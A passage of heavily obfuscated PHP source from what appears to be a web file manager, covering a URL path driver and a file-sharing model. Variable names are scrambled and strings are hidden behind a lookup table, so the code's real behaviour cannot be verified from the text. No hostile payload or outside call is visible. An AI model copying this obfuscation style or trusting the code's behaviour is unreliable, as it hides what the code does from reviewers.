$ÜõÓÏ’¿ =& $_SERVER[ˆë€Ï⁄∂]; if ($⁄Ù—›ö∫ == $ÜõÓÏ’¿[12] || $⁄Ù—›ö∫ == $ÜõÓÏ’¿[8]) { return array(); } $¿¥◊Ÿ§É = $this->ussRequest($⁄Ù—›ö∫, $ÜõÓÏ’¿[1615]); if (!$¿¥◊Ÿ§É[$ÜõÓÏ’¿[1312]]) { return null; } $ãí¸”åÈ = isset($¿¥◊Ÿ§É[$ÜõÓÏ’¿[1302]]) ? $¿¥◊Ÿ§É[$ÜõÓÏ’¿[1302]] : array(); if (!isset($ãí¸”åÈ[$ÜõÓÏ’¿[1616]])) { return null; } $¬ÅåŸäÙ = array($ÜõÓÏ’¿[33] => isset($ãí¸”åÈ[$ÜõÓÏ’¿[1616]]) ? $ãí¸”åÈ[$ÜõÓÏ’¿[1616]] : null, $ÜõÓÏ’¿[89] => isset($ãí¸”åÈ[$ÜõÓÏ’¿[1617]]) ? $ãí¸”åÈ[$ÜõÓÏ’¿[1617]] : null, $ÜõÓÏ’¿[257] => isset($ãí¸”åÈ[$ÜõÓÏ’¿[1618]]) ? $ãí¸”åÈ[$ÜõÓÏ’¿[1618]] : null, $ÜõÓÏ’¿[1585] => isset($ãí¸”åÈ[$ÜõÓÏ’¿[1619]]) ? $ãí¸”åÈ[$ÜõÓÏ’¿[1619]] : null); $¬ÅåŸäÙ[$ÜõÓÏ’¿[1586]] = isset($ãí¸”åÈ[$ÜõÓÏ’¿[1620]]) ? strtotime($ãí¸”åÈ[$ÜõÓÏ’¿[1620]]) : $¬ÅåŸäÙ[$ÜõÓÏ’¿[1585]]; return $¬ÅåŸäÙ; } protected function _isFolder($óı∫ÏÄ◊) { $∆≠Ü€ÑÎ =& $_SERVER[ˆë€Ï⁄∂]; if ($óı∫ÏÄ◊ == $∆≠Ü€ÑÎ[12] || $óı∫ÏÄ◊ == $∆≠Ü€ÑÎ[8]) { return !0; } $Û‰®ØÙò = $this->_objectMeta($óı∫ÏÄ◊); return isset($Û‰®ØÙò[$∆≠Ü€ÑÎ[33]]) && $Û‰®ØÙò[$∆≠Ü€ÑÎ[33]] == $∆≠Ü€ÑÎ[88] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ñˆµÄ÷¥ = false) { } public function exist($ƒ≈Ü™·´) { $€®Ωÿë£ = $this->info($ƒ≈Ü™·´); return $€®Ωÿë£[$_SERVER[ˆë€Ï⁄∂][244]]; } public function isFile($»◊›¨è°) { $Ûπ“î„¥ = $this->info($»◊›¨è°); return $Ûπ“î„¥[$_SERVER[ˆë€Ï⁄∂][244]]; } public function isFolder($Ÿ∑¸˙éÍ) { return !1; } public function size($™›‹†˛¶) { $„ìç˘úä = $this->info($™›‹†˛¶); return $„ìç˘úä[$_SERVER[ˆë€Ï⁄∂][89]]; } public function info($˙üá»¯¯) { return $this->infoParse($˙üá»¯¯); } public function infoAuth($ÅÏÀ¿¶º) { return $this->infoParse($ÅÏÀ¿¶º); } public function infoWithChildren($ë˝«°íñ) { return $this->infoParse($ë˝«°íñ); } public function infoFull($ﬁ–∫¯ÊÏ) { return $this->infoParse($ﬁ–∫¯ÊÏ); } private function infoParse($∑¯±ò∞») { $Ã‹üóœÛ =& $_SERVER[ˆë€Ï⁄∂]; $éçóœÿ√ = $this->header($∑¯±ò∞»); if (!$éçóœÿ√ || !$éçóœÿ√[$Ã‹üóœÛ[841]]) { return !1; } $ÀÙŒ¯ù˙ = _get($éçóœÿ√, $Ã‹üóœÛ[423], 0); $ÑÉëæ“” = array($Ã‹üóœÛ[32] => $éçóœÿ√[$Ã‹üóœÛ[32]], $Ã‹üóœÛ[97] => $∑¯±ò∞», $Ã‹üóœÛ[33] => $Ã‹üóœÛ[242], $Ã‹üóœÛ[89] => intval($ÀÙŒ¯ù˙), $Ã‹üóœÛ[179] => get_path_ext($éçóœÿ√[$Ã‹üóœÛ[32]]), $Ã‹üóœÛ[1471] => $ÀÙŒ¯ù˙ > 0 && $éçóœÿ√[$Ã‹üóœÛ[1621]], $Ã‹üóœÛ[1472] => !1); return $ÑÉëæ“”; } private function header($∏øÑ‹‰Ù) { $‘‹•∫∂∆ =& $_SERVER[ˆë€Ï⁄∂]; if (isset(self::$_cacheHeader[$∏øÑ‹‰Ù])) { return self::$_cacheHeader[$∏øÑ‹‰Ù]; } $Å∆ÌéØç = isset($GLOBALS[$‘‹•∫∂∆[1622]]) ? $GLOBALS[$‘‹•∫∂∆[1622]] : !1; $GLOBALS[$‘‹•∫∂∆[1622]] = !0; self::$_cacheHeader[$∏øÑ‹‰Ù] = url_header($∏øÑ‹‰Ù); $GLOBALS[$‘‹•∫∂∆[1622]] = $Å∆ÌéØç; return self::$_cacheHeader[$∏øÑ‹‰Ù]; } public function hashSimple($·¨Âåœ¿, $ŸÂÚ∂¶Ñ = false) { $†èµ“¿† =& $_SERVER[ˆë€Ï⁄∂]; $¿¨ú†•≈ = $this->info($·¨Âåœ¿); if (!$¿¨ú†•≈ || !$¿¨ú†•≈[$†èµ“¿†[244]]) { return !1; } $˙™ÂΩùˆ = $¿¨ú†•≈[$†èµ“¿†[89]]; $ıÚÀ®ãí = 200; $Ç÷Ø†•Ö = 50; if ($˙™ÂΩùˆ <= $ıÚÀ®ãí * $Ç÷Ø†•Ö) { return md5($this->fileSubstr($·¨Âåœ¿, 0, $˙™ÂΩùˆ)) . $˙™ÂΩùˆ; } $ŸÒâæÅ• = intval($˙™ÂΩùˆ / $Ç÷Ø†•Ö); $ù¶Åáÿ˙ = $†èµ“¿†[12]; $˜ËÓë„ = timeFloat(); $äÿ©œÛÖ = 15; for ($€òÉ¯«• = 0; $€òÉ¯«• < $Ç÷Ø†•Ö; $€òÉ¯«•++) { if (timeFloat() - $˜ËÓë„ > $äÿ©œÛÖ) { return !1; } $„‡‚è¯Â = $this->fileSubstr($·¨Âåœ¿, $ŸÒâæÅ• * $€òÉ¯«•, $ıÚÀ®ãí); if (!$„‡‚è¯Â) { return !1; } $ù¶Åáÿ˙ .= $„‡‚è¯Â; } $ù¶Åáÿ˙ .= $this->fileSubstr($·¨Âåœ¿, $˙™ÂΩùˆ - $ıÚÀ®ãí, $ıÚÀ®ãí); return md5($ù¶Åáÿ˙) . $˙™ÂΩùˆ; } public function getContent($à ÷äŒÔ) { return $this->fileSubstr($à ÷äŒÔ); } public function fileSubstr($≠÷ù†…Ù, $ÅÎõÈ’Ú = 0, $‚‚’∞íÜ = -1) { $”¬úæ¢ˆ =& $_SERVER[ˆë€Ï⁄∂]; $ÿÊØåß… = $this->info($≠÷ù†…Ù); if (!$ÿÊØåß… || !$ÿÊØåß…[$”¬úæ¢ˆ[244]] && $ÿÊØåß…[$”¬úæ¢ˆ[89]] > 1024 * 1024 * 10) { return !1; } if ($‚‚’∞íÜ === -1) { $‚‚’∞íÜ = $ÿÊØåß…[$”¬úæ¢ˆ[89]]; } if ($‚‚’∞íÜ == 0) { return $”¬úæ¢ˆ[12]; } $”±∂ª∆  = array($”¬úæ¢ˆ[1623] . $ÅÎõÈ’Ú . $”¬úæ¢ˆ[877] . ($ÅÎõÈ’Ú + $‚‚’∞íÜ - 1)); $≈‘©€∑⁄ = url_request($≠÷ù†…Ù, $”¬úæ¢ˆ[1511], !1, $”±∂ª∆ , !1, !1, 30); return $≈‘©€∑⁄[$”¬úæ¢ˆ[1302]] ? $≈‘©€∑⁄[$”¬úæ¢ˆ[1302]] : $”¬úæ¢ˆ[12]; } public function download($ï≈∏Ö”è, $°áèï«¶) { Downloader::start($ï≈∏Ö”è, $°áèï«¶); return $°áèï«¶; } } goto fµ£∫ç¡ˆ‚; a†Çõ°›„‰: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\x72\x65"; protected $dataAuto = array(array("\155\157\x64\x69\x66\171\124\151\x6d\145", "\164\x69\155\145", "\x69\156\163\x65\162\164\54\x75\160\144\x61\164\145", "\x66\x75\156\x63\164\151\x6f\x6e"), array("\143\x72\145\x61\x74\x65\124\x69\x6d\145", "\164\151\155\x65", "\151\156\x73\145\162\164", "\146\165\156\x63\x74\151\x6f\x6e"), array("\157\x70\164\151\x6f\x6e\163", '', "\151\x6e\x73\x65\x72\164\x2c\165\160\144\141\164\x65\54\163\145\154\145\143\x74", "\x6a\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($°Åü¢ƒ›) { $Ì’◊åÜì =& $_SERVER[ˆë€Ï⁄∂]; $»®»õ∑ì = isset($°Åü¢ƒ›[0]) ? $°Åü¢ƒ›[0] : !1; $’µù∏·ø = $Ì’◊åÜì[2131] . USER_ID; return array($Ì’◊åÜì[2132] => array(USER_ID, $Ì’◊åÜì[2133]), $Ì’◊åÜì[2072] => array($»®»õ∑ì, $Ì’◊åÜì[2134], $’µù∏·ø)); } protected function listSimple() { $Íﬂ∑ë¶â = array($_SERVER[ˆë€Ï⁄∂][1787] => USER_ID); $úŸ¶âõÔ = $this->field($this->fieldList)->where($Íﬂ∑ë¶â)->select(); return $úŸ¶âõÔ ? $úŸ¶âõÔ : array(); } protected function getInfo($¯â–π∑˚, $Ÿ–Íúøë = false, $ßÔ™ŒÅê = '') { $Ùèâÿ¡Æ =& $_SERVER[ˆë€Ï⁄∂]; if (!$ßÔ™ŒÅê) { $ßÔ™ŒÅê = $Ùèâÿ¡Æ[2131] . USER_ID; } if ($Ÿ–Íúøë) { return $this->_getShareInfo(array($Ùèâÿ¡Æ[679] => $¯â–π∑˚)); } $åÇ“Ô≥Ø = $this->cacheFunctionGet($Ùèâÿ¡Æ[2074], $¯â–π∑˚, $ßÔ™ŒÅê); $ôØã†àÿ = $this->shareInfoMofify($åÇ“Ô≥Ø, $Ùèâÿ¡Æ[235]); if (isset($åÇ“Ô≥Ø[$Ùèâÿ¡Æ[98]]) && $ôØã†àÿ != $åÇ“Ô≥Ø[$Ùèâÿ¡Æ[98]]) { $ê«√˘»≠ = $this->cacheKeyMake($Ùèâÿ¡Æ[2074], $¯â–π∑˚, $ßÔ™ŒÅê); $åÇ“Ô≥Ø = $this->_getShareInfo(array($Ùèâÿ¡Æ[679] => $¯â–π∑˚)); Cache::set($ê«√˘»≠, $åÇ“Ô≥Ø); } return $åÇ“Ô≥Ø; } private function shareInfoMofify(&$…ãö˘Õê, $Â‚Ù˛◊  = "\147\x65\164") { $·ì˚π∞° =& $_SERVER[ˆë€Ï⁄∂]; if (!$…ãö˘Õê || !isset($…ãö˘Õê[$·ì˚π∞°[679]])) { return; } $Ø˛Ñ‹¿Â = $·ì˚π∞°[2135] . $…ãö˘Õê[$·ì˚π∞°[679]]; if ($Â‚Ù˛◊  == $·ì˚π∞°[235]) { return Cache::get($Ø˛Ñ‹¿Â); } else { if ($Â‚Ù˛◊  == $·ì˚π∞°[2102]) { $˚ÑÍÇ˜‰ = Cache::get($Ø˛Ñ‹¿Â); if ($˚ÑÍÇ˜‰ === $…ãö˘Õê[$·ì˚π∞°[98]]) { return; } $…ãö˘Õê[$·ì˚π∞°[2136]] = USER_ID . $·ì˚π∞°[473] . $…ãö˘Õê[$·ì˚π∞°[98]]; Cache::set($Ø˛Ñ‹¿Â, $…ãö˘Õê[$·ì˚π∞°[98]]); } else { if ($Â‚Ù˛◊  == $·ì˚π∞°[2137]) { Cache::remove($Ø˛Ñ‹¿Â); } } } } public function getInfoByHash($Á‹≤Ò≤á) { return $this->_getShareInfo(array($_SERVER[ˆë€Ï⁄∂][2138] => $Á‹≤Ò≤á)); } public function getInfoByPath($‰‘£ÍÄº) { $ﬂÆï«åö =& $_SERVER[ˆë€Ï⁄∂]; $Ó‰ÅΩ¿◊ = array($ﬂÆï«åö[1787] => USER_ID, $ﬂÆï«åö[203] => $‰‘£ÍÄº); return $this->_getShareInfo($Ó‰ÅΩ¿◊); } public function getInfoBySourcePath($ñëøØ†Ø) { $Û¬‡Á¸ô =& $_SERVER[ˆë€Ï⁄∂]; $ﬂ√Ó⁄ñ≥ = array($Û¬‡Á¸ô[1787] => USER_ID, $Û¬‡Á¸ô[1272] => $ñëøØ†Ø); return $this->_getShareInfo($ﬂ√Ó⁄ñ≥); } private function _getShareInfo($˛åÉ∑∂€) { $ãá†≈Ω∂ =& $_SERVER[ˆë€Ï⁄∂]; $§º™◊ÒÈ = $this->where($˛åÉ∑∂€)->find(); if (!$§º™◊ÒÈ) { return !1; } $˛åÉ∑∂€ = array($ãá†≈Ω∂[679] => $§º™◊ÒÈ[$ãá†≈Ω∂[679]]); $‡»•·∂ã = $ãá†≈Ω∂[2139]; $Ω˚óõ◊Ì = Model($ãá†≈Ω∂[680])->order($ãá†≈Ω∂[486])->field($‡»•·∂ã)->where($˛åÉ∑∂€)->select(); if ($§º™◊ÒÈ[$ãá†≈Ω∂[203]] == $ãá†≈Ω∂[240]) { $§º™◊ÒÈ[$ãá†≈Ω∂[100]] = IO::info($§º™◊ÒÈ[$ãá†≈Ω∂[1272]]); } else { $§º™◊ÒÈ[$ãá†≈Ω∂[100]] = Model($ãá†≈Ω∂[1436])->pathInfo($§º™◊ÒÈ[$ãá†≈Ω∂[203]]); } $§º™◊ÒÈ[$ãá†≈Ω∂[2140]] = $Ω˚óõ◊Ì; $this->shareInfoMofify($§º™◊ÒÈ, $ãá†≈Ω∂[2102]); return $§º™◊ÒÈ; } protected function getInfoAuth($·Ωÿòû) { $óñ¸Ø‡◊ =& $_SERVER[ˆë€Ï⁄∂]; $¶˝Ÿ”ﬂ√ = $this->getInfo($·Ωÿòû); if ($¶˝Ÿ”ﬂ√[$óñ¸Ø‡◊[1787]] == USER_ID) { $¶˝Ÿ”ﬂ√[$óñ¸Ø‡◊[498]] = $¶˝Ÿ”ﬂ√[$óñ¸Ø‡◊[100]][$óñ¸Ø‡◊[498]]; } else { $¶˝Ÿ”ﬂ√[$óñ¸Ø‡◊[498]] = Model($óñ¸Ø‡◊[578])->authMake($¶˝Ÿ”ﬂ√[$óñ¸Ø‡◊[2140]]); } return $¶˝Ÿ”ﬂ√; } protected function listData($∞‘…Ôºó = null, $Œ˚¨»ª€ = 300) { $ÌÚêƒÂ¬ =& $_SERVER[ˆë€Ï⁄∂]; $”éëŒñ¢ = array(array($ÌÚêƒÂ¬[573] => array($ÌÚêƒÂ¬[1104], 0), $ÌÚêƒÂ¬[677] => array($ÌÚêƒÂ¬[1104], 0), $ÌÚêƒÂ¬[2141] => $ÌÚêƒÂ¬[2090])); if ($∞‘…Ôºó == $ÌÚêƒÂ¬[2142]) { $”éëŒñ¢ = array($ÌÚêƒÂ¬[573] => 1); } else { if ($∞‘…Ôºó == $ÌÚêƒÂ¬[1257]) { $”éëŒñ¢ = array($ÌÚêƒÂ¬[677] => 1); } } $”éëŒñ¢[$ÌÚêƒÂ¬[1787]] = USER_ID; $Õúà€üÑ = $this->where($”éëŒñ¢)->selectPage($Œ˚¨»ª€); return $Õúà€üÑ; } protected function listToMe($—§åûã¿ = 300) { $“≈“®âÅ =& $_SERVER[ˆë€Ï⁄∂]; $Òÿøûá  = Model($“≈“®âÅ[2143])->userGroupParents(USER_ID); $äÇ’úªï = array($“≈“®âÅ[662] => SourceModel::TYPE_USER, $“≈“®âÅ[580] => USER_ID); if ($Òÿøûá ) { $äÇ’úªï = array(array($“≈“®âÅ[662] => SourceModel::TYPE_USER, $“≈“®âÅ[580] => USER_ID), array($“≈“®âÅ[662] => SourceModel::TYPE_GROUP, $“≈“®âÅ[580] => array($“≈“®âÅ[7], $Òÿøûá )), $“≈“®âÅ[2141] => $“≈“®âÅ[2090]); } $∏©‡·«ª = Model($“≈“®âÅ[680])->where($äÇ’úªï)->selectPage($—§åûã¿); $ù€ËØ°Î = array_to_keyvalue_group($∏©‡·«ª[$“≈“®âÅ[456]], $“≈“®âÅ[679]); if (!$ù€ËØ°Î) { return $∏©‡·«ª; } $’æ˝ÿôß = $“≈“®âÅ[2144]; $äÇ’úªï = array($“≈“®âÅ[679] => array($“≈“®âÅ[503], array_keys($ù€ËØ°Î)), $“≈“®âÅ[1787] => array($“≈“®âÅ[1106], $“≈“®âÅ[240])); $ì—˛„“Ö = $this->field($’æ˝ÿôß)->where($äÇ’úªï)->select(); foreach ($ì—˛„“Ö as $Æ”Íã·ª => &$É¥ÅﬂÎ⁄) { $É¥ÅﬂÎ⁄[$“≈“®âÅ[2140]] = $ù€ËØ°Î[$É¥ÅﬂÎ⁄[$“≈“®âÅ[679]]]; } unset($É¥ÅﬂÎ⁄); $»˘◊ùÁ· = array($“≈“®âÅ[2145] => $ì—˛„“Ö, $“≈“®âÅ[2146] => $∏©‡·«ª[$“≈“®âÅ[453]]); return $»˘◊ùÁ·; } protected function shareAdd($õ–Í˚ã‡, $‘–«È¢É) { $ª¸—˛Õë =& $_SERVER[ˆë€Ï⁄∂]; $åøº‡©Ñ = $this->_addShareData($õ–Í˚ã‡, $‘–«È¢É); if (!empty($‘–«È¢É[$ª¸—˛Õë[2147]])) { $this->_shareAuthSet($åøº‡©Ñ, $‘–«È¢É[$ª¸—˛Õë[2147]]); } $this->shareEventAdd($õ–Í˚ã‡, $‘–«È¢É, $ª¸—˛Õë[2148]); return $åøº‡©Ñ; } protected function shareAddSystem($ù∏úÌÎ˚, $ï•¨§ƒä) { $°§œíåä =& $_SERVER[ˆë€Ï⁄∂]; $ÛÉ§»ßõ = $this->_addShareData($ù∏úÌÎ˚, $ï•¨§ƒä, $°§œíåä[201]); $this->_shareAuthSet($ÛÉ§»ßõ, $ï•¨§ƒä[$°§œíåä[2147]]); return $ÛÉ§»ßõ; } private function shareEventAdd($ü’∑π≤†, $êæÒÉè„, $Ÿﬁﬁó™è = "\141\144\144") { $•π¶’ıÄ =& $_SERVER[ˆë€Ï⁄∂]; if (!$ü’∑π≤† || $ü’∑π≤† == $•π¶’ıÄ[240]) { return; } if ($Ÿﬁﬁó™è == $•π¶’ıÄ[2148]) { if ($êæÒÉè„[$•π¶’ıÄ[573]] == $•π¶’ıÄ[101]) { Model($•π¶’ıÄ[647])->eventShare($ü’∑π≤†, $•π¶’ıÄ[2149]); } if ($êæÒÉè„[$•π¶’ıÄ[677]] == $•π¶’ıÄ[101]) { Model($•π¶’ıÄ[647])->eventShare($ü’∑π≤†, $•π¶’ıÄ[2150]); } return; } $á‚¸æ‚” = $this->getInfoByPath($ü’∑π≤†); $ﬂÁä†… = $•π¶’ıÄ[2151]; if ($á‚¸æ‚”[$•π¶’ıÄ[573]] == $•π¶’ıÄ[240] && $êæÒÉè„[$•π¶’ıÄ[573]] == $•π¶’ıÄ[101]) { $ﬂÁä†… = $•π¶’ıÄ[2149]; } if ($á‚¸æ‚”[$•π¶’ıÄ[573]] == $•π¶’ıÄ[101] && $êæÒÉè„[$•π¶’ıÄ[573]] == $•π¶’ıÄ[240]) { $ﬂÁä†… = $•π¶’ıÄ[2152]; } if ($á‚¸æ‚”[$•π¶’ıÄ[677]] == $•π¶’ıÄ[240] && $êæÒÉè„[$•π¶’ıÄ[677]] == $•π¶’ıÄ[101]) { $ﬂÁä†… = $•π¶’ıÄ[2150]; } if ($á‚¸æ‚”[$•π¶’ıÄ[677]] == $•π¶’ıÄ[101] && $êæÒÉè„[$•π¶’ıÄ[677]] == $•π¶’ıÄ[240]) { $ﬂÁä†… = $•π¶’ıÄ[2153]; } Model($•π¶’ıÄ[647])->eventShare($ü’∑π≤†, $ﬂÁä†…); return; } private function _addShareData($Ã˛ÆÂÜü, $Ö¸±¡Úˆ = array(), $çû·‘≥Ê = false) { $«¯∑çª =& $_SERVER[ˆë€Ï⁄∂]; $¥∂Æıò¬ = $çû·‘≥Ê == $«¯∑çª[201] ? 0 : USER_ID; $òûëÒ≈‚ = array($«¯∑çª[502] => $Ã˛ÆÂÜü, $«¯∑çª[1778] => $¥∂Æıò¬); if ($Ã˛ÆÂÜü == 0) { $òûëÒ≈‚ = array($«¯∑çª[2154] => $Ö¸±¡Úˆ[$«¯∑çª[1272]], $«¯∑çª[1778] => $¥∂Æıò¬); } if ($¡¯‡ƒ¯¬ = $this->where($òûëÒ≈‚)->find()) { return $¡¯‡ƒ¯¬[$«¯∑çª[679]]; } if ($Ã˛ÆÂÜü == 0) { $÷÷÷Î√ü = array($«¯∑çª[32] => get_path_this($Ö¸±¡Úˆ[$«¯∑çª[97]])); } else { $÷÷÷Î√ü = Model($«¯∑çª[916])->sourceInfo($Ã˛ÆÂÜü); if (!$÷÷÷Î√ü) { return !1; } } if (!$Ö¸±¡Úˆ[$«¯∑çª[1675]]) { $Ö¸±¡Úˆ[$«¯∑çª[1675]] = $÷÷÷Î√ü[$«¯∑çª[32]]; } $Ï∆Ä∆ÉÈ = array($«¯∑çª[1778] => $¥∂Æıò¬, $«¯∑çª[502] => $Ã˛ÆÂÜü, $«¯∑çª[1675] => $«¯∑çª[12], $«¯∑çª[573] => 0, $«¯∑çª[677] => 0, $«¯∑çª[1272] => $«¯∑çª[12], $«¯∑çª[393] => $«¯∑çª[12], $«¯∑çª[981] => $«¯∑çª[12], $«¯∑çª[2155] => 0, $«¯∑çª[2156] => 0, $«¯∑çª[852] => 0, $«¯∑çª[2157] => $«¯∑çª[12], $«¯∑çª[2138] => $«¯∑çª[12]); $ùèøŒŸò = explode($«¯∑çª[50], $«¯∑çª[2158]); foreach ($ùèøŒŸò as $ƒíøõ®ô) { if (!isset($Ö¸±¡Úˆ[$ƒíøõ®ô])) { continue; } $Ï∆Ä∆ÉÈ[$ƒíøõ®ô] = $Ö¸±¡Úˆ[$ƒíøõ®ô]; } $å†≥·ÓÈ = $this->add($Ï∆Ä∆ÉÈ); $…«ß∆ßÌ = array($«¯∑çª[2138] => short_id($å†≥·ÓÈ)); $this->where(array($«¯∑çª[2159] => $å†≥·ÓÈ))->save($…«ß∆ßÌ); return $å†≥·ÓÈ; } private function _shareAuthSet($Ù≥‹˚Êê, $˘ÆÖË∑›) { $ô„ƒö∂ù =& $_SERVER[ˆë€Ï⁄∂]; if (!is_array($˘ÆÖË∑›)) { return !1; } $Å›Úá÷ä = Model($ô„ƒö∂ù[2100]); $Å›Úá÷ä->where(array($ô„ƒö∂ù[679] => $Ù≥‹˚Êê))->delete(); $®≈ºº¸‡ = array(); foreach ($˘ÆÖË∑› as $ë¯ìﬁÄË) { $®‚ƒ≤∫Ù = SourceModel::TYPE_USER; if ($ë¯ìﬁÄË[$ô„ƒö∂ù[200]] == SourceModel::TYPE_GROUP) { $®‚ƒ≤∫Ù = SourceModel::TYPE_GROUP; } $∑…æº◊Ô = array($ô„ƒö∂ù[679] => $Ù≥‹˚Êê, $ô„ƒö∂ù[200] => $®‚ƒ≤∫Ù, $ô„ƒö∂ù[580] => intval($ë¯ìﬁÄË[$ô„ƒö∂ù[580]]), $ô„ƒö∂ù[2096] => 0, $ô„ƒö∂ù[2160] => -1); if ($ë¯ìﬁÄË[$ô„ƒö∂ù[2096]]) { $∑…æº◊Ô[$ô„ƒö∂ù[2096]] = $ë¯ìﬁÄË[$ô„ƒö∂ù[2096]]; } else { if ($ë¯ìﬁÄË[$ô„ƒö∂ù[2160]]) { $∑…æº◊Ô[$ô„ƒö∂ù[2160]] = $ë¯ìﬁÄË[$ô„ƒö∂ù[2160]]; } } $®≈ºº¸‡[] = $∑…æº◊Ô; } return $Å›Úá÷ä->addAll($®≈ºº¸‡, array(), !0); } public function numViewAdd($“¸Ÿ‡Ãû) { $ÕËÌü‚Æ =& $_SERVER[ˆë€Ï⁄∂]; $∫º¢Áü¬ = array($ÕËÌü‚Æ[2159] => $“¸Ÿ‡Ãû); $this->where($∫º¢Áü¬)->setAdd($ÕËÌü‚Æ[2155]); } public function numDownloadAdd($Éªå¶Ó…) { $¡Ôò¯ì∏ =& $_SERVER[ˆë€Ï⁄∂]; $ºÑïöÄˆ = array($¡Ôò¯ì∏[2159] => $Éªå¶Ó…); $this->where($ºÑïöÄˆ)->setAdd($¡Ôò¯ì∏[2156]); } protected function shareEdit($íƒÉ›ˆ≤, $ûóƒ≠Éâ) { $÷Ñ≈˚Í± =& $_SERVER[ˆë€Ï⁄∂]; $¢‰µïõä = $this->getInfo($íƒÉ›ˆ≤); if (!$¢‰µïõä) { return !1; } $this->_checkLinkShare($ûóƒ≠Éâ, $¢‰µïõä); $çË°©°Â = array(); $ÿªª±§’ = explode($÷Ñ≈˚Í±[50], $÷Ñ≈˚Í±[2161]); foreach ($ÿªª±§’ as $ÖﬁÕÖûõ) { if (!array_key_exists($ÖﬁÕÖûõ, $ûóƒ≠Éâ)) { continue; } $çË°©°Â[$ÖﬁÕÖûõ] = $ûóƒ≠Éâ[$ÖﬁÕÖûõ]; } $this->shareEventAdd($¢‰µïõä[$÷Ñ≈˚Í±[203]], $ûóƒ≠Éâ, $÷Ñ≈˚Í±[1957]); $this->where(array($÷Ñ≈˚Í±[2159] => $íƒÉ›ˆ≤))->save($çË°©°Â); if (isset($ûóƒ≠Éâ[$÷Ñ≈˚Í±[2147]])) { $this->_shareAuthSet($íƒÉ›ˆ≤, $ûóƒ≠Éâ[$÷Ñ≈˚Í±[2147]]); } return !0; } private function _checkLinkShare($Ö˛ ‰˛Ú, $Õ†€¨Àª) { $≤òñÊµ€ =& $_SERVER[ˆë€Ï⁄∂]; if ($Ö˛ ‰˛Ú[$≤òñÊµ€[573]] != $≤òñÊµ€[101]) { return; } $‘˝Ò¨ê∞ = $Õ†€¨Àª[$≤òñÊµ€[100]][$≤òñÊµ€[203]]; if ($Õ†€¨Àª[$≤òñÊµ€[100]][$≤òñÊµ€[33]] != $≤òñÊµ€[242]) { $Ñ◊”ò¡á = $this->_folderReport($‘˝Ò¨ê∞); if (!$Ñ◊”ò¡á) { return; } show_json(LNG($≤òñÊµ€[2162]) . $≤òñÊµ€[2163] . $Ñ◊”ò¡á, !1); } $®Ò¬ ˆÙ = Model($≤òñÊµ€[916])->fileInfoGet($Õ†€¨Àª[$≤òñÊµ€[100]][$≤òñÊµ€[203]]); if (!$®Ò¬ ˆÙ) { return; } $†œ≠Èø„ = $this->shareFileMeta($®Ò¬ ˆÙ[$≤òñÊµ€[552]]); if (isset($†œ≠Èø„[$≤òñÊµ€[461]]) && $†œ≠Èø„[$≤òñÊµ€[461]] == $≤òñÊµ€[101]) { show_json(LNG($≤òñÊµ€[2164]), !1); } } private function _folderReport($≠—¡”åé) { $Œ∞®‰Ïù =& $_SERVER[ˆë€Ï⁄∂]; $¸≈˜ì¨∑ = array($Œ∞®‰Ïù[552] => array($Œ∞®‰Ïù[1104], 0), $Œ∞®‰Ïù[841] => 3); $öìºËÉ§ = Model($Œ∞®‰Ïù[2165])->where($¸≈˜ì¨∑)->field($Œ∞®‰Ïù[552])->select(); if (!$öìºËÉ§) { return !1; } $öìºËÉ§ = array_to_keyvalue($öìºËÉ§, $Œ∞®‰Ïù[12], $Œ∞®‰Ïù[552]); $˝¨Ñ˝Ó˝ = $Œ∞®‰Ïù[50] . $≠—¡”åé . $Œ∞®‰Ïù[50]; $¸≈˜ì¨∑ = array($Œ∞®‰Ïù[552] => array($Œ∞®‰Ïù[7], $öìºËÉ§), $Œ∞®‰Ïù[595] => array($Œ∞®‰Ïù[470], "\x25{$˝¨Ñ˝Ó˝}\45"), $Œ∞®‰Ïù[516] => 0); $⁄Ù‡•˜¬ = Model($Œ∞®‰Ïù[916])->where($¸≈˜ì¨∑)->field($Œ∞®‰Ïù[2166])->find(); if (!$⁄Ù‡•˜¬) { return !1; } $áâÖº©ﬂ = substr($⁄Ù‡•˜¬[$Œ∞®‰Ïù[595]], strpos($⁄Ù‡•˜¬[$Œ∞®‰Ïù[595]], $˝¨Ñ˝Ó˝)); $¸≈˜ì¨∑ = array($Œ∞®‰Ïù[203] => array($Œ∞®‰Ïù[7], trim($áâÖº©ﬂ, $Œ∞®‰Ïù[50]))); $Â£ù˘µ¨ = Model($Œ∞®‰Ïù[916])->where($¸≈˜ì¨∑)->field($Œ∞®‰Ïù[32])->select(); $◊ú≤ä„“ = array_to_keyvalue($Â£ù˘µ¨, $Œ∞®‰Ïù[12], $Œ∞®‰Ïù[32]); $◊ú≤ä„“[] = $⁄Ù‡•˜¬[$Œ∞®‰Ïù[32]]; return implode($Œ∞®‰Ïù[8], $◊ú≤ä„“); } protected function remove($πÖ≈à‡Ÿ) { $¸◊‹´˚Ê =& $_SERVER[ˆë€Ï⁄∂]; $®Ñ“ª›© = is_array($πÖ≈à‡Ÿ) ? $πÖ≈à‡Ÿ : array($πÖ≈à‡Ÿ); for ($‰Ø§£À¬ = 0; $‰Ø§£À¬ < count($®Ñ“ª›©); $‰Ø§£À¬++) { $ÒÖóæ·í = $this->getInfo($®Ñ“ª›©[$‰Ø§£À¬]); if ($ÒÖóæ·í[$¸◊‹´˚Ê[677]] == $¸◊‹´˚Ê[101]) { Model($¸◊‹´˚Ê[647])->eventShare($ÒÖóæ·í[$¸◊‹´˚Ê[203]], $¸◊‹´˚Ê[2153]); } if ($ÒÖóæ·í[$¸◊‹´˚Ê[573]] == $¸◊‹´˚Ê[101]) { Model($¸◊‹´˚Ê[647])->eventShare($ÒÖóæ·í[$¸◊‹´˚Ê[203]], $¸◊‹´˚Ê[2152]); } $this->shareInfoMofify($ÒÖóæ·í, $¸◊‹´˚Ê[2137]); } $˝„…ŒŸî = array($¸◊‹´˚Ê[679] => array($¸◊‹´˚Ê[7], $®Ñ“ª›©)); $≈õŸ±¨» = $this->where($˝„…ŒŸî)->delete(); if ($≈õŸ±¨») { Model($¸◊‹´˚Ê[680])->where($˝„…ŒŸî)->delete(); } return $≈õŸ±¨»; } protected function removeBySource($∂§ªâÚÎ) { $î˚†˚Î∏ =& $_SERVER[ˆë€Ï⁄∂]; $„ûΩãâû = array($î˚†˚Î∏[502] => array($î˚†˚Î∏[503], $∂§ªâÚÎ)); $Õ«•úñ– = 